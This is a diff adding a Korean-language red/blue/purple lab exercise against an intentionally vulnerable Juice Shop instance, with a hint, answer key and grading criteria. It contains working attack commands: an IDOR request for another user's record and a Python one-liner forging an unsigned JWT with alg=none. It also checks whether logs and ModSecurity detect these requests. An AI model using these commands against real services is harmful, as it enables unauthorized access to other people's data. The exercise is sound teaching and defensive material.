@@ -516,3 +516,80 @@ steps:
           - "**[관리적] 한국 ISMS-P 통제 매핑**"
           - "**[관리적] 임원 + 운영 + 분석가 의 3 청자**"
     target_vm: bastion
+
+  # ============================================================
+  # STEP 6 — R/B/P 종합 mission (IDOR + JWT alg=none 의 1 cycle)
+  # ============================================================
+  - order: 6
+    instruction: |
+      ## 🎯 MISSION (R/B/P 종합)
+
+      본 주차 의 IDOR + JWT alg=none 의 1 cycle. **Red = 자신 token 의 IDOR + alg=none
+      token 시도 / Blue = access.log + ModSec 의 standard 룰 의 비매치 / Purple =
+      ModSec custom rule + application ACL 의 필요성 분석**.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # Red — login + IDOR
+      TOKEN=$(ssh 6v6-attacker 'curl -s -d "{\"email\":\"user@me\",\"password\":\"user\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login | jq -r .authentication.token')
+      ssh 6v6-attacker "curl -s -H 'Authorization: Bearer $TOKEN' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/1 | jq ."
+
+      # Red — alg=none token 생성
+      ssh 6v6-attacker 'python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode(); p=base64.urlsafe_b64encode(json.dumps({\"id\":1}).encode()).rstrip(b\"=\").decode(); print(h+\".\"+p+\".\")"'
+
+      # Blue — access.log
+      ssh 6v6-web "sudo tail -20 /var/log/apache2/access.log | grep '/api/Users/'"
+
+      # Purple — Coverage 한 줄
+      echo "Coverage: ModSec 표준 매치 X (HTTP 정상). application ACL + custom rule 필요"
+      ```
+
+      ## 📋 확인 사항
+
+      - IDOR 응답 = 200 + 다른 user data (JuiceShop = 의도 vuln)
+      - alg=none token = `header.payload.` (signature 비어 있음)
+      - access.log = 정상 200 응답 (alert X)
+      - Purple Coverage = ModSec custom rule 의 필요성
+
+      ## 💡 왜 이걸 하는가?
+
+      IDOR + JWT 의 R/B/P 특수성 = HTTP 형식 의 정상 → ModSec 의 사후 detection 의
+      한계. application ACL + ModSec custom rule 의 2 layer defense 의 직접 확인.
+
+      ## 🔍 결과 해석
+
+      - **정상**: IDOR 200 + alg=none token 생성 + Coverage 한 줄
+      - **비정상 1**: TOKEN 비어 있음 = login 실패 → user 계정 등록 확인
+      - **비정상 2**: IDOR 403 = JuiceShop 패치 → 학습 환경 vuln 활성 확인
+    hint: 'TOKEN=...login; curl -H Authorization /api/Users/1'
+    category: rbp_integration
+    points: 6
+    answer: |
+      echo "=== Red: login + IDOR ==="
+      TOKEN=$(ssh 6v6-attacker 'curl -s -d "{\"email\":\"user@me\",\"password\":\"user\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login | jq -r .authentication.token' 2>/dev/null)
+      ssh 6v6-attacker "curl -s -H 'Authorization: Bearer $TOKEN' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/1 | head -c 200"
+      echo ""
+      echo "=== Red: alg=none token ==="
+      ssh 6v6-attacker 'python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode(); p=base64.urlsafe_b64encode(json.dumps({\"id\":1}).encode()).rstrip(b\"=\").decode(); print(h+\".\"+p+\".\")"'
+      echo "=== Blue: access.log ==="
+      ssh 6v6-web "sudo tail -20 /var/log/apache2/access.log | grep '/api/Users/' | head -3"
+      echo "=== Purple ==="
+      echo "Coverage: ModSec 표준 매치 X, application ACL + ModSec custom rule 필요"
+    answer_detail: |
+      IDOR + JWT alg=none 의 1 cycle. ModSec 표준 룰 의 한계 + application 책임 +
+      custom rule 의 필요성 의 직접 확인.
+    verify:
+      type: output_contains
+      expect: 'Coverage'
+      field: stdout
+      semantic:
+        intent: IDOR + JWT alg=none 의 R/B/P 1 cycle 분석
+        success_criteria:
+          - IDOR 시도 + 응답 분석
+          - alg=none token 생성
+          - Purple Coverage Gap 한 줄
+        acceptable_methods:
+          - "**[OSS] curl IDOR + python alg=none + jq access.log**"
+          - "**[OSS] Burp Repeater manual IDOR**"
+    target_vm: attacker
